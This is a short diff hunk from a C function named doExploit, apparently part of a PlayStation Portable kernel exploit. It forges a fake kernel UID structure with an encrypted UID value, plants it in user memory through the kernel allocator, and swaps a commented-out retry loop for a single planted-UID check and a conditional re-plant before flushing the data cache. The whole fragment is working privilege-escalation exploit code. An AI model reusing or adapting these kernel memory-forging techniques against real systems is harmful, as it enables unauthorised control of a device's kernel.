@@ -151,17 +151,15 @@ int doExploit(void) {
     u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)(&string[0]), PSP_SMEM_Low, 0x10, NULL);
 
-    /*
-    while (!checkPlantUID(uid)){
-      // retry
-      newaddr += 4;
-      uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
+    int found = checkPlantUID(uid);
+    if (!found) return -1;
+
+    if (newaddr != dummyaddr-FAKE_UID_OFFSET){
       encrypted_uid = uid ^ seed;
       string[3] = encrypted_uid;
       g_tbl->KernelFreePartitionMemory(plantid);
       g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)(&string[0]), PSP_SMEM_Low, 0x10, NULL);
     }
-    */
 
     g_tbl->KernelDcacheWritebackAll();
 
